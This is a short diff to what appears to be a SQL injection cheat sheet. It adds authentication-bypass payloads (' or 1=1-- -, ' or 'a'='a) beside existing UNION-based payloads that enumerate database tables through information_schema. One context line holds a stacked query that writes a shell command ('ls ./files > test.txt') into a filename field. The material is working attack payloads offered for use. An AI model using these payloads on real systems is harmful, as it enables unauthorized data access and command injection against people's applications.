@@ -109,6 +109,10 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 ```
 ### Data retrieval
 ```
+' or 1=1-- -
+
+' or 'a'='a
+
 ' union select 1,2,3,4,5 -- -
 
 ' union select 1,2,3,table_schema,table_name from information_schema.tables -- - >> To fetch database name with table name
